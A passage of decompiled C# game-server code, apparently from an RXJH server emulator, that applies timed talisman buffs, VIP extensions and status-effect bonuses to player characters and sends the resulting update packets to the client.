						base.FLD_人物_追加_历练百分比 += 0.5;
						base.FLD_人物_追加_获得游戏币百分比 += 0.2;
						base.FLD_人物_追加_合成成功率百分比 += 0.05;
						base.FLD_人物_追加_贩卖价格百分比 += 0.2;
						break;
					case 1008000028:
						System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array, 10, 1);
						base.FLD_人物_追加_经验百分比 += 0.2;
						base.FLD_人物_追加_历练百分比 += 0.5;
						base.FLD_人物_追加_获得游戏币百分比 += 0.2;
						base.FLD_人物_追加_贩卖价格百分比 += 0.2;
						break;
					case 1008000029:
						System.Buffer.BlockCopy(BitConverter.GetBytes(1), 0, array, 10, 1);
						base.FLD_人物_追加_经验百分比 += 0.2;
						base.FLD_人物_追加_历练百分比 += 0.5;
						base.FLD_人物_追加_获得游戏币百分比 += 0.2;
						break;
					case 1008000141:
						System.Buffer.BlockCopy(BitConverter.GetBytes(37), 0, array, 10, 1);
						base.FLD_人物_追加_经验百分比 += 0.3;
						base.FLD_人物_追加_历练百分比 += 0.3;
						base.FLD_人物_追加_获得游戏币百分比 += 0.2;
						base.FLD_人物_追加_合成成功率百分比 += 0.05;
						base.FLD_人物_追加_贩卖价格百分比 += 0.2;
						base.FLD_人物_追加_吸魂几率百分比 += 15.0;
						base.FLD_人物_追加_武勋获得量百分比 += 0.5;
						break;
					case 1008000140:
						System.Buffer.BlockCopy(BitConverter.GetBytes(36), 0, array, 10, 1);
						base.FLD_人物_追加_经验百分比 += 0.25;
						base.FLD_人物_追加_历练百分比 += 0.5;
						base.FLD_人物_追加_获得游戏币百分比 += 0.2;
						base.FLD_人物_追加_合成成功率百分比 += 0.05;
						base.FLD_人物_追加_贩卖价格百分比 += 0.2;
						break;
					case 1008000124:
						System.Buffer.BlockCopy(BitConverter.GetBytes(35), 0, array, 10, 1);
						base.FLD_人物_追加_经验百分比 += 0.25;
						base.FLD_人物_追加_历练百分比 += 0.5;
						base.FLD_人物_追加_获得游戏币百分比 += 0.2;
						base.FLD_人物_追加_合成成功率百分比 += 0.05;
						base.FLD_人物_追加_贩卖价格百分比 += 0.2;
						break;
					case 1008000312:
						System.Buffer.BlockCopy(BitConverter.GetBytes(70), 0, array, 10, 1);
						base.FLD_人物_追加_经验百分比 += 0.3;
						base.FLD_人物_追加_历练百分比 += 0.3;
						base.FLD_人物_追加_获得游戏币百分比 += 0.2;
						base.FLD_人物_追加_合成成功率百分比 += 0.05;
						base.FLD_人物_追加_贩卖价格百分比 += 0.2;
						base.FLD_人物_追加_吸魂几率百分比 += 15.0;
						base.FLD_人物_追加_武勋获得量百分比 += 0.5;
						base.FLD_人物_追加_物品掉落概率百分比 += 0.2;
						break;
					case 1008000311:
						System.Buffer.BlockCopy(BitConverter.GetBytes(69), 0, array, 10, 1);
						base.FLD_人物_追加_经验百分比 += 0.2;
						base.FLD_人物_追加_历练百分比 += 0.2;
						base.FLD_人物_追加_获得游戏币百分比 += 0.2;
						base.FLD_人物_追加_合成成功率百分比 += 0.05;
						base.FLD_人物_追加_贩卖价格百分比 += 0.2;
						base.FLD_人物_追加_武勋获得量百分比 += 0.5;
						base.FLD_人物_追加_吸魂几率百分比 += 15.0;
						break;
					default:
						System.Buffer.BlockCopy(BitConverter.GetBytes(4), 0, array, 10, 1);
						break;
					case 1008000877:
						System.Buffer.BlockCopy(BitConverter.GetBytes(69), 0, array, 10, 1);
						base.FLD_人物_追加_经验百分比 += 0.2;
						base.FLD_人物_追加_历练百分比 += 0.2;
						base.FLD_人物_追加_获得游戏币百分比 += 0.2;
						base.FLD_人物_追加_合成成功率百分比 += 0.05;
						base.FLD_人物_追加_贩卖价格百分比 += 0.2;
						base.FLD_人物_追加_武勋获得量百分比 += 0.5;
						base.FLD_人物_追加_吸魂几率百分比 += 15.0;
						break;
					case 1008000320:
						System.Buffer.BlockCopy(BitConverter.GetBytes(37), 0, array, 10, 1);
						base.FLD_人物_追加_经验百分比 += 0.3;
						base.FLD_人物_追加_历练百分比 += 0.3;
						base.FLD_人物_追加_获得游戏币百分比 += 0.2;
						base.FLD_人物_追加_合成成功率百分比 += 0.05;
						base.FLD_人物_追加_贩卖价格百分比 += 0.2;
						base.FLD_人物_追加_吸魂几率百分比 += 15.0;
						base.FLD_人物_追加_武勋获得量百分比 += 0.5;
						base.FLD_人物_追加_物品掉落概率百分比 += 0.2;
						break;
					case 1008000318:
						base.FLD_人物_追加_经验百分比 += 0.3;
						base.FLD_人物_追加_历练百分比 += 0.3;
						base.FLD_人物_追加_获得游戏币百分比 += 0.2;
						base.FLD_人物_追加_合成成功率百分比 += 0.05;
						base.FLD_人物_追加_贩卖价格百分比 += 0.2;
						base.FLD_人物_追加_吸魂几率百分比 += 15.0;
						base.FLD_人物_追加_武勋获得量百分比 += 0.5;
						base.FLD_人物_追加_物品掉落概率百分比 += 0.2;
						base.FLD_人物_追加_物品掉落概率百分比 += 0.2;
						break;
					}
					System.Buffer.BlockCopy(BitConverter.GetBytes(yp.时间), 0, array, 11, 4);
					System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
					if (base.Client != null)
					{
						base.Client.Send(array, array.Length);
					}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "set公有物品出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 打开符(byte[] 封包数据, int 封包大小)
		{
			try
			{
				if (公有药品.Count < 2)
				{
					封包修改(封包数据, 封包大小);
					int num = 封包数据[20];
					byte[] array = new byte[4];
					System.Buffer.BlockCopy(封包数据, 12, array, 0, 4);
					int itmeid = Converter.getItmeid(Converter.ToString(array));
					switch (itmeid)
					{
					case 1008000058:
						if (BitConverter.ToInt32(装备栏包裹[num].物品ID, 0) == 1008000058 && !检查符())
						{
							DateTime value12 = new DateTime(1970, 1, 1, 8, 0, 0);
							TimeSpan timeSpan12 = DateTime.Now.AddDays(10.0).Subtract(value12);
							公有药品类 公有药品类12 = new 公有药品类();
							公有药品类12.药品ID = itmeid;
							公有药品类12.时间 = (int)timeSpan12.TotalSeconds;
							公有药品.Add(公有药品类12.药品ID, 公有药品类12);
							set公有物品(公有药品类12);
							减去物品(num, 1);
							RxjhClass.药品记录(base.Userid, base.UserName, 公有药品类12.药品ID, "无极金尊符(10天)", 1);
						}
						break;
					case 1008000059:
						if (BitConverter.ToInt32(装备栏包裹[num].物品ID, 0) == 1008000059 && !检查符())
						{
							DateTime value6 = new DateTime(1970, 1, 1, 8, 0, 0);
							TimeSpan timeSpan6 = DateTime.Now.AddDays(10.0).Subtract(value6);
							公有药品类 公有药品类6 = new 公有药品类();
							公有药品类6.药品ID = itmeid;
							公有药品类6.时间 = (int)timeSpan6.TotalSeconds;
							公有药品.Add(公有药品类6.药品ID, 公有药品类6);
							set公有物品(公有药品类6);
							减去物品(num, 1);
							RxjhClass.药品记录(base.Userid, base.UserName, 公有药品类6.药品ID, "天启银尊符(10天)", 1);
						}
						break;
					case 1008000060:
						if (BitConverter.ToInt32(装备栏包裹[num].物品ID, 0) == 1008000060 && !检查符())
						{
							DateTime value14 = new DateTime(1970, 1, 1, 8, 0, 0);
							TimeSpan timeSpan14 = DateTime.Now.AddDays(10.0).Subtract(value14);
							公有药品类 公有药品类14 = new 公有药品类();
							公有药品类14.药品ID = itmeid;
							公有药品类14.时间 = (int)timeSpan14.TotalSeconds;
							公有药品.Add(公有药品类14.药品ID, 公有药品类14);
							set公有物品(公有药品类14);
							减去物品(num, 1);
							RxjhClass.药品记录(base.Userid, base.UserName, 公有药品类14.药品ID, "玄武赤炼符(10天)", 1);
						}
						break;
					case 1008000061:
						if (BitConverter.ToInt32(装备栏包裹[num].物品ID, 0) == 1008000061 && !检查符())
						{
							DateTime value2 = new DateTime(1970, 1, 1, 8, 0, 0);
							TimeSpan timeSpan2 = DateTime.Now.AddDays(2.0).Subtract(value2);
							公有药品类 公有药品类2 = new 公有药品类();
							公有药品类2.药品ID = itmeid;
							公有药品类2.时间 = (int)timeSpan2.TotalSeconds;
							公有药品.Add(公有药品类2.药品ID, 公有药品类2);
							set公有物品(公有药品类2);
							减去物品(num, 1);
							增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(800000005), num, BitConverter.GetBytes(1), new byte[56]);
							RxjhClass.药品记录(base.Userid, base.UserName, 公有药品类2.药品ID, "无极金尊符(2天)", 1);
						}
						break;
					case 1008000062:
						if (BitConverter.ToInt32(装备栏包裹[num].物品ID, 0) == 1008000059 && !检查符())
						{
							DateTime value7 = new DateTime(1970, 1, 1, 8, 0, 0);
							TimeSpan timeSpan7 = DateTime.Now.AddDays(2.0).Subtract(value7);
							公有药品类 公有药品类7 = new 公有药品类();
							公有药品类7.药品ID = itmeid;
							公有药品类7.时间 = (int)timeSpan7.TotalSeconds;
							公有药品.Add(公有药品类7.药品ID, 公有药品类7);
							set公有物品(公有药品类7);
							减去物品(num, 1);
							RxjhClass.药品记录(base.Userid, base.UserName, 公有药品类7.药品ID, "天启银尊符(2天)", 1);
						}
						break;
					case 1008000063:
						if (BitConverter.ToInt32(装备栏包裹[num].物品ID, 0) == 1008000063 && !检查符())
						{
							DateTime value17 = new DateTime(1970, 1, 1, 8, 0, 0);
							TimeSpan timeSpan17 = DateTime.Now.AddDays(2.0).Subtract(value17);
							公有药品类 公有药品类17 = new 公有药品类();
							公有药品类17.药品ID = itmeid;
							公有药品类17.时间 = (int)timeSpan17.TotalSeconds;
							公有药品.Add(公有药品类17.药品ID, 公有药品类17);
							set公有物品(公有药品类17);
							减去物品(num, 1);
							RxjhClass.药品记录(base.Userid, base.UserName, 公有药品类17.药品ID, "礼物玄武赤炼符(2天)", 1);
						}
						break;
					case 1008000027:
						if (BitConverter.ToInt32(装备栏包裹[num].物品ID, 0) == 1008000027 && !检查符())
						{
							DateTime value8 = new DateTime(1970, 1, 1, 8, 0, 0);
							TimeSpan timeSpan8 = DateTime.Now.AddDays(30.0).Subtract(value8);
							公有药品类 公有药品类8 = new 公有药品类();
							公有药品类8.药品ID = itmeid;
							公有药品类8.时间 = (int)timeSpan8.TotalSeconds;
							公有药品.Add(公有药品类8.药品ID, 公有药品类8);
							set公有物品(公有药品类8);
							减去物品(num, 1);
							RxjhClass.药品记录(base.Userid, base.UserName, 公有药品类8.药品ID, "无极金尊符(30天)", 1);
						}
						break;
					case 1008000028:
						if (BitConverter.ToInt32(装备栏包裹[num].物品ID, 0) == 1008000028 && !检查符())
						{
							DateTime value5 = new DateTime(1970, 1, 1, 8, 0, 0);
							TimeSpan timeSpan5 = DateTime.Now.AddDays(30.0).Subtract(value5);
							公有药品类 公有药品类5 = new 公有药品类();
							公有药品类5.药品ID = itmeid;
							公有药品类5.时间 = (int)timeSpan5.TotalSeconds;
							公有药品.Add(公有药品类5.药品ID, 公有药品类5);
							set公有物品(公有药品类5);
							减去物品(num, 1);
							增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(800000005), num, BitConverter.GetBytes(1), new byte[56]);
							RxjhClass.药品记录(base.Userid, base.UserName, 公有药品类5.药品ID, "天启银尊符(30天)", 1);
						}
						break;
					case 1008000029:
						if (BitConverter.ToInt32(装备栏包裹[num].物品ID, 0) == 1008000029 && !检查符())
						{
							DateTime value15 = new DateTime(1970, 1, 1, 8, 0, 0);
							TimeSpan timeSpan15 = DateTime.Now.AddDays(30.0).Subtract(value15);
							公有药品类 公有药品类15 = new 公有药品类();
							公有药品类15.药品ID = itmeid;
							公有药品类15.时间 = (int)timeSpan15.TotalSeconds;
							公有药品.Add(公有药品类15.药品ID, 公有药品类15);
							set公有物品(公有药品类15);
							减去物品(num, 1);
							增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(800000005), num, BitConverter.GetBytes(1), new byte[56]);
							RxjhClass.药品记录(base.Userid, base.UserName, 公有药品类15.药品ID, "玄武赤炼符(30天)", 1);
						}
						break;
					case 1008000141:
						if (BitConverter.ToInt32(装备栏包裹[num].物品ID, 0) == 1008000141 && !检查符2())
						{
							DateTime value11 = new DateTime(1970, 1, 1, 8, 0, 0);
							TimeSpan timeSpan11 = DateTime.Now.AddDays(10.0).Subtract(value11);
							公有药品类 公有药品类11 = new 公有药品类();
							公有药品类11.药品ID = itmeid;
							公有药品类11.时间 = (int)timeSpan11.TotalSeconds;
							公有药品.Add(公有药品类11.药品ID, 公有药品类11);
							set公有物品(公有药品类11);
							减去物品(num, 1);
							RxjhClass.药品记录(base.Userid, base.UserName, 公有药品类11.药品ID, "至尊符(10天)", 1);
						}
						break;
					case 1008000140:
						if (BitConverter.ToInt32(装备栏包裹[num].物品ID, 0) == 1008000140 && !检查符2())
						{
							DateTime value9 = new DateTime(1970, 1, 1, 8, 0, 0);
							TimeSpan timeSpan9 = DateTime.Now.AddDays(1.0).Subtract(value9);
							公有药品类 公有药品类9 = new 公有药品类();
							公有药品类9.药品ID = itmeid;
							公有药品类9.时间 = (int)timeSpan9.TotalSeconds;
							公有药品.Add(公有药品类9.药品ID, 公有药品类9);
							set公有物品(公有药品类9);
							减去物品(num, 1);
							RxjhClass.药品记录(base.Userid, base.UserName, 公有药品类9.药品ID, "至尊符(1天)", 1);
						}
						break;
					case 1008000124:
						if (BitConverter.ToInt32(装备栏包裹[num].物品ID, 0) == 1008000124 && !检查符2())
						{
							DateTime value3 = new DateTime(1970, 1, 1, 8, 0, 0);
							TimeSpan timeSpan3 = DateTime.Now.AddDays(30.0).Subtract(value3);
							公有药品类 公有药品类3 = new 公有药品类();
							公有药品类3.药品ID = itmeid;
							公有药品类3.时间 = (int)timeSpan3.TotalSeconds;
							公有药品.Add(公有药品类3.药品ID, 公有药品类3);
							set公有物品(公有药品类3);
							减去物品(num, 1);
							RxjhClass.药品记录(base.Userid, base.UserName, 公有药品类3.药品ID, "至尊符(30天)", 1);
						}
						break;
					case 1008000318:
						if (BitConverter.ToInt32(装备栏包裹[num].物品ID, 0) == 1008000318 && !检查符2())
						{
							DateTime value16 = new DateTime(1970, 1, 1, 8, 0, 0);
							TimeSpan timeSpan16 = DateTime.Now.AddDays(1.0).Subtract(value16);
							公有药品类 公有药品类16 = new 公有药品类();
							公有药品类16.药品ID = itmeid;
							公有药品类16.时间 = (int)timeSpan16.TotalSeconds;
							公有药品.Add(公有药品类16.药品ID, 公有药品类16);
							set公有物品(公有药品类16);
							减去物品(num, 1);
							RxjhClass.药品记录(base.Userid, base.UserName, 公有药品类16.药品ID, "至尊热血符(1天)", 1);
						}
						break;
					case 1008000312:
						if (BitConverter.ToInt32(装备栏包裹[num].物品ID, 0) == 1008000312 && !检查符2())
						{
							DateTime value13 = new DateTime(1970, 1, 1, 8, 0, 0);
							TimeSpan timeSpan13 = DateTime.Now.AddDays(30.0).Subtract(value13);
							公有药品类 公有药品类13 = new 公有药品类();
							公有药品类13.药品ID = itmeid;
							公有药品类13.时间 = (int)timeSpan13.TotalSeconds;
							公有药品.Add(公有药品类13.药品ID, 公有药品类13);
							set公有物品(公有药品类13);
							减去物品(num, 1);
							RxjhClass.药品记录(base.Userid, base.UserName, 公有药品类13.药品ID, "至尊热血符(30天)", 1);
						}
						break;
					case 1008000311:
						if (BitConverter.ToInt32(装备栏包裹[num].物品ID, 0) == 1008000311 && !检查符2())
						{
							DateTime value10 = new DateTime(1970, 1, 1, 8, 0, 0);
							TimeSpan timeSpan10 = DateTime.Now.AddDays(30.0).Subtract(value10);
							公有药品类 公有药品类10 = new 公有药品类();
							公有药品类10.药品ID = itmeid;
							公有药品类10.时间 = (int)timeSpan10.TotalSeconds;
							公有药品.Add(公有药品类10.药品ID, 公有药品类10);
							set公有物品(公有药品类10);
							减去物品(num, 1);
							RxjhClass.药品记录(base.Userid, base.UserName, 公有药品类10.药品ID, "热血符(30天)", 1);
						}
						break;
					case 1008001584:
						物品使用(1, num, 1);
						if (base.FLD_VIP != 0)
						{
							base.FLD_VIPTIM = base.FLD_VIPTIM.AddDays(30.0);
						}
						else
						{
							base.FLD_VIP = 1;
							base.FLD_VIPTIM = DateTime.Now.AddDays(30.0);
						}
						系统提示("您的VIP到期时间为:" + base.FLD_VIPTIM.ToString());
						保存会员数据();
						break;
					case 1008000877:
						if (BitConverter.ToInt32(装备栏包裹[num].物品ID, 0) == 1008000877 && !检查符2())
						{
							DateTime value4 = new DateTime(1970, 1, 1, 8, 0, 0);
							TimeSpan timeSpan4 = DateTime.Now.AddDays(1.0).Subtract(value4);
							公有药品类 公有药品类4 = new 公有药品类();
							公有药品类4.药品ID = itmeid;
							公有药品类4.时间 = (int)timeSpan4.TotalSeconds;
							公有药品.Add(公有药品类4.药品ID, 公有药品类4);
							set公有物品(公有药品类4);
							减去物品(num, 1);
							RxjhClass.药品记录(base.Userid, base.UserName, 公有药品类4.药品ID, "热血符(活动)", 1);
						}
						break;
					case 1008000320:
						if (BitConverter.ToInt32(装备栏包裹[num].物品ID, 0) == 1008000320 && !检查符2())
						{
							DateTime value = new DateTime(1970, 1, 1, 8, 0, 0);
							TimeSpan timeSpan = DateTime.Now.AddDays(10.0).Subtract(value);
							公有药品类 公有药品类 = new 公有药品类();
							公有药品类.药品ID = itmeid;
							公有药品类.时间 = (int)timeSpan.TotalSeconds;
							公有药品.Add(公有药品类.药品ID, 公有药品类);
							set公有物品(公有药品类);
							减去物品(num, 1);
							RxjhClass.药品记录(base.Userid, base.UserName, 公有药品类.药品ID, "至尊热血符(10天)", 1);
						}
						break;
					}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "打开符出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void Set追加状态物品()
		{
			if (追加状态物品New != null && 追加状态物品New.Length != 1)
			{
				try
				{
					for (int i = 0; i < 15 && 追加状态物品New.Length >= (i + 1) * 16; i++)
					{
						byte[] array = new byte[4];
						byte[] array2 = new byte[4];
						byte[] array3 = new byte[4];
						byte[] array4 = new byte[4];
						System.Buffer.BlockCopy(追加状态物品New, i * 16, array, 0, 4);
						if (Buffer.ToInt32(array, 0) > 0)
						{
							System.Buffer.BlockCopy(追加状态物品New, i * 16 + 4, array2, 0, 4);
							if (Buffer.ToInt32(array2, 0) > 0)
							{
								System.Buffer.BlockCopy(追加状态物品New, i * 16 + 8, array3, 0, 4);
								if (Buffer.ToInt32(array3, 0) > 0)
								{
									System.Buffer.BlockCopy(追加状态物品New, i * 16 + 12, array4, 0, 4);
									Set追加状态物品(Buffer.ToInt32(array, 0), Buffer.ToInt32(array2, 0), Buffer.ToInt32(array3, 0), Buffer.ToInt32(array4, 0));
								}
							}
						}
					}
				}
				catch (Exception ex)
				{
					Form1.WriteLine(1, "Set追加状态物品出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
				}
			}
		}

		public void Set追加状态物品(int FLD_PID, int 时间, int 数量, int 数量类型)
		{
			try
			{
				switch (FLD_PID)
				{
				case 1:
				{
					if (GetAddStateNew(FLD_PID))
					{
						追加状态New列表[FLD_PID].时间结束事件();
					}
					追加状态New类 value14 = new 追加状态New类(this, FLD_PID, 时间, 数量, 数量类型);
					追加状态New列表.Add(FLD_PID, value14);
					switch (数量类型)
					{
					case 2:
						addFLD_追加百分比_攻击(0.01 * (double)数量);
						break;
					case 1:
						base.FLD_人物_追加_攻击 += 数量;
						break;
					}
					break;
				}
				case 2:
				{
					if (GetAddStateNew(FLD_PID))
					{
						追加状态New列表[FLD_PID].时间结束事件();
					}
					追加状态New类 value10 = new 追加状态New类(this, FLD_PID, 时间, 数量, 数量类型);
					追加状态New列表.Add(FLD_PID, value10);
					switch (数量类型)
					{
					case 2:
						addFLD_追加百分比_防御(0.01 * (double)数量);
						break;
					case 1:
						base.FLD_人物_追加_防御 += 数量;
						break;
					}
					break;
				}
				case 3:
				{
					if (GetAddStateNew(FLD_PID))
					{
						追加状态New列表[FLD_PID].时间结束事件();
					}
					追加状态New类 value9 = new 追加状态New类(this, FLD_PID, 时间, 数量, 数量类型);
					追加状态New列表.Add(FLD_PID, value9);
					switch (数量类型)
					{
					case 2:
						base.FLD_追加百分比_HP上限 += 0.01 * (double)数量;
						break;
					case 1:
						base.人物追加最大_HP += 数量;
						break;
					}
					break;
				}
				case 4:
				{
					if (GetAddStateNew(FLD_PID))
					{
						追加状态New列表[FLD_PID].时间结束事件();
					}
					追加状态New类 value2 = new 追加状态New类(this, FLD_PID, 时间, 数量, 数量类型);
					追加状态New列表.Add(FLD_PID, value2);
					switch (数量类型)
					{
					case 2:
						base.FLD_追加百分比_MP上限 += 0.01 * (double)数量;
						break;
					case 1:
						base.人物追加最大_MP += 数量;
						break;
					}
					break;
				}
				case 5:
				{
					if (GetAddStateNew(FLD_PID))
					{
						追加状态New列表[FLD_PID].时间结束事件();
					}
					追加状态New类 value13 = new 追加状态New类(this, FLD_PID, 时间, 数量, 数量类型);
					追加状态New列表.Add(FLD_PID, value13);
					switch (数量类型)
					{
					case 2:
						base.FLD_追加百分比_命中 += 0.01 * (double)数量;
						break;
					case 1:
						base.FLD_人物_追加_命中 += 数量;
						break;
					}
					break;
				}
				case 6:
				{
					if (GetAddStateNew(FLD_PID))
					{
						追加状态New列表[FLD_PID].时间结束事件();
					}
					追加状态New类 value15 = new 追加状态New类(this, FLD_PID, 时间, 数量, 数量类型);
					追加状态New列表.Add(FLD_PID, value15);
					switch (数量类型)
					{
					case 2:
						base.FLD_人物_追加百分比_回避 += 0.01 * (double)数量;
						break;
					case 1:
						base.FLD_人物_追加_回避 += 数量;
						break;
					}
					break;
				}
				case 7:
				{
					if (GetAddStateNew(FLD_PID))
					{
						追加状态New列表[FLD_PID].时间结束事件();
					}
					追加状态New类 value6 = new 追加状态New类(this, FLD_PID, 时间, 数量, 数量类型);
					追加状态New列表.Add(FLD_PID, value6);
					if (数量类型 == 2)
					{
						base.FLD_人物_武功攻击力增加百分比 += 0.01 * (double)数量;
					}
					break;
				}
				case 8:
				{
					if (GetAddStateNew(FLD_PID))
					{
						追加状态New列表[FLD_PID].时间结束事件();
					}
					追加状态New类 value4 = new 追加状态New类(this, FLD_PID, 时间, 数量, 数量类型);
					追加状态New列表.Add(FLD_PID, value4);
					switch (数量类型)
					{
					case 2:
						base.FLD_人物_武功防御力增加百分比 += 0.01 * (double)数量;
						break;
					case 1:
						base.FLD_人物_追加_回避 += 数量;
						break;
					}
					break;
				}
				case 9:
				{
					if (GetAddStateNew(FLD_PID))
					{
						追加状态New列表[FLD_PID].时间结束事件();
					}
					追加状态New类 value11 = new 追加状态New类(this, FLD_PID, 时间, 数量, 数量类型);
					追加状态New列表.Add(FLD_PID, value11);
					if (数量类型 == 2)
					{
						base.FLD_人物_追加_经验百分比 += 0.01 * (double)数量;
					}
					break;
				}
				case 10:
				{
					if (GetAddStateNew(FLD_PID))
					{
						追加状态New列表[FLD_PID].时间结束事件();
					}
					追加状态New类 value7 = new 追加状态New类(this, FLD_PID, 时间, 数量, 数量类型);
					追加状态New列表.Add(FLD_PID, value7);
					if (数量类型 == 2)
					{
						base.FLD_人物_追加_合成成功率百分比 += 0.01 * (double)数量;
					}
					break;
				}
				case 11:
				{
					if (GetAddStateNew(FLD_PID))
					{
						追加状态New列表[FLD_PID].时间结束事件();
					}
					追加状态New类 value3 = new 追加状态New类(this, FLD_PID, 时间, 数量, 数量类型);
					追加状态New列表.Add(FLD_PID, value3);
					break;
				}
				case 12:
				{
					if (GetAddStateNew(FLD_PID))
					{
						追加状态New列表[FLD_PID].时间结束事件();
					}
					追加状态New类 value12 = new 追加状态New类(this, FLD_PID, 时间, 数量, 数量类型);
					追加状态New列表.Add(FLD_PID, value12);
					if (数量类型 == 2)
					{
						base.FLD_人物_追加_获得游戏币百分比 += 0.01 * (double)数量;
					}
					break;
				}
				case 13:
				{
					if (GetAddStateNew(FLD_PID))
					{
						追加状态New列表[FLD_PID].时间结束事件();
					}
					追加状态New类 value8 = new 追加状态New类(this, FLD_PID, 时间, 数量, 数量类型);
					追加状态New列表.Add(FLD_PID, value8);
					if (数量类型 == 2)
					{
						base.FLD_人物_追加_物品掉落概率百分比 += 0.01 * (double)数量;
					}
					break;
				}
				case 14:
				{
					if (GetAddStateNew(FLD_PID))
					{
						追加状态New列表[FLD_PID].时间结束事件();
					}
					追加状态New类 value5 = new 追加状态New类(this, FLD_PID, 时间, 数量, 数量类型);
					追加状态New列表.Add(FLD_PID, value5);
					base.FLD_人物_追加_气功 += 数量;
					更新气功();
					break;
				}
				case 15:
				{
					if (GetAddStateNew(FLD_PID))
					{
						追加状态New列表[FLD_PID].时间结束事件();
					}
					追加状态New类 value = new 追加状态New类(this, FLD_PID, 时间, 数量, 数量类型);
					追加状态New列表.Add(FLD_PID, value);
					if (数量类型 == 2)
					{
						base.FLD_人物_追加_历练百分比 += 0.01 * (double)数量;
					}
					break;
				}
				}
				状态效果New(FLD_PID, 1, 时间, 数量, 数量类型);
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "Set追加状态物品2  出错：[" + FLD_PID + "]" + ((ex != null) ? ex.ToString() : null));
			}
		}

		public void set时间物品()
		{
			foreach (时间药品类 value in 时间药品.Values)
			{
				set时间物品(value);
			}
		}

		public void set时间物品(时间药品类 药品)
		{
			try
			{
				switch (药品.药品ID)
				{
				case 1008001994:
				{
					TimeSpan timeSpan2 = DateTime.ParseExact(药品.时间.ToString(), "yyMMddHHmm", CultureInfo.CurrentCulture) - DateTime.Now;
					萌犬表情效果(1008001994, 1, 药品.时间, (int)timeSpan2.TotalMinutes);
					break;
				}
				case 1008001993:
				{
					TimeSpan timeSpan = DateTime.ParseExact(药品.时间.ToString(), "yyMMddHHmm", CultureInfo.CurrentCulture) - DateTime.Now;
					萌犬表情效果(1008001993, 1, 药品.时间, (int)timeSpan.TotalMinutes);
					break;
				}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "set时间物品出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void Set个人药品()
		{
			try
			{
				if (个人药品 != null && 个人药品.Length != 1)
				{
					for (int i = 0; i < 30 && 个人药品.Length >= (i + 1) * 8; i++)
					{
						byte[] array = new byte[4];
						byte[] array2 = new byte[4];
						System.Buffer.BlockCopy(个人药品, i * 8, array, 0, 4);
						System.Buffer.BlockCopy(个人药品, i * 8 + 4, array2, 0, 4);
						if (BitConverter.ToInt32(array, 0) > 0 && BitConverter.ToInt32(array2, 0) > 0)
						{
							int num = BitConverter.ToInt32(array, 0);
							int num2 = BitConverter.ToInt32(array2, 0);
							switch (num)
							{
							case 9000088:
							case 9000104:
							case 9000105:
							case 9000144:
							case 9000145:
							case 9000168:
							case 9001214:
							case 9009077:
							case 9009092:
							case 9009151:
							case 9009788:
							case 9009789:
							case 9009790:
							case 9009820:
							case 9009964:
							{
								if (追加状态列表.ContainsKey(num))
								{
									追加状态列表[num].时间结束事件();
								}
								状态效果(BitConverter.GetBytes(num), 1, num2);
								追加状态类 追加状态类2 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类2.FLD_PID, 追加状态类2);
								base.FLD_人物_追加_历练百分比 += 0.5;
								break;
							}
							case 9000085:
							case 9000120:
							case 9000121:
							case 9000165:
							case 9000166:
							case 9000317:
							case 9001207:
							case 9001211:
							case 9001215:
							case 9009076:
							case 9009150:
							case 9009217:
							case 9009309:
							case 9009839:
							case 9009941:
							case 9009943:
							case 9009965:
							case 9009966:
							case 9009970:
							{
								if (追加状态列表.ContainsKey(num))
								{
									追加状态列表[num].时间结束事件();
								}
								状态效果(BitConverter.GetBytes(num), 1, num2);
								追加状态类 追加状态类60 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类60.FLD_PID, 追加状态类60);
								base.FLD_人物_追加_经验百分比 += 0.2;
								break;
							}
							case 900000619:
							{
								安全模式 = 0;
								if (追加状态列表.ContainsKey(num))
								{
									追加状态列表[num].时间结束事件();
								}
								追加状态类 追加状态类26 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类26.FLD_PID, 追加状态类26);
								状态效果(BitConverter.GetBytes(num), 1, num2);
								安全模式 = 1;
								break;
							}
							case 1000000099:
							{
								if (追加状态列表.ContainsKey(num))
								{
									追加状态列表[num].时间结束事件();
								}
								追加状态类 追加状态类45 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类45.FLD_PID, 追加状态类45);
								状态效果(BitConverter.GetBytes(num), 1, num2);
								break;
							}
							case 1000000030:
							{
								if (追加状态列表.ContainsKey(num))
								{
									追加状态列表[num].时间结束事件();
								}
								状态效果(BitConverter.GetBytes(num), 1, num2);
								追加状态类 追加状态类66 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类66.FLD_PID, 追加状态类66);
								double num4 = base.FLD_人物_追加_历练百分比 += 1.0;
								break;
							}
							case 900000072:
							case 900000073:
							case 900000074:
							case 900000258:
							case 999000163:
							case 999000164:
							case 999000165:
							{
								追加状态类 追加状态类62 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类62.FLD_PID, 追加状态类62);
								状态效果(BitConverter.GetBytes(num), 1, num2);
								break;
							}
							case 1007000005:
							{
								if (追加状态列表.ContainsKey(num))
								{
									追加状态列表[num].时间结束事件();
								}
								状态效果(BitConverter.GetBytes(num), 1, num2);
								追加状态类 追加状态类35 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类35.FLD_PID, 追加状态类35);
								base.人物追加最大_HP += 300;
								break;
							}
							case 1007000006:
							{
								if (追加状态列表.ContainsKey(num))
								{
									追加状态列表[num].时间结束事件();
								}
								状态效果(BitConverter.GetBytes(num), 1, num2);
								追加状态类 追加状态类21 = new 追加状态类(this, num2, num, 1);
